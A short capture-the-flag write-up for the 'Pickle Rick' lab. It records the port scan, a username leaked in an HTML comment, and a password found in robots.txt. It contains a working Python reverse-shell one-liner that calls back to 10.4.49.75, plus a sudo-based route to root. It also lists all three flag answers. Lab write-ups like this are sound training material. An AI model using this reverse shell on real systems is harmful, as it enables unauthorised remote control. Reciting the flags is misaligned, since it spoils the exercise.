# Pickle Rick

# 25 September 2021

# Nmap 

22/tcp
80/tcp

# Web Directories

 <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

robots.txt >

Wubbalubbadubdub

# Login
Completed
# Python Reverse Shell 

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.49.75",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# Bash Shell Discovery

www-data@ip-10-10-20-66:/var/www/html$ ls
ls
Sup3rS3cretPickl3Ingred.txt > ` mr. meeseek hair  `
assets 
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

/home/rick > `1 jerry tear`

# Escalating Privileges

www-data@ip-10-10-20-66:/home/rick$ sudo -l
sudo -l
Matching Defaults entries for www-data on
    ip-10-10-20-66.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-20-66.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

# Root

cd /root/
ls

3rd.txt
snap

cat 3rd.txt

3rd ingredients: `fleeb juice`

# All Ingredients

# mr. meseek hair

# fleeb juice

# 1 jerry tear




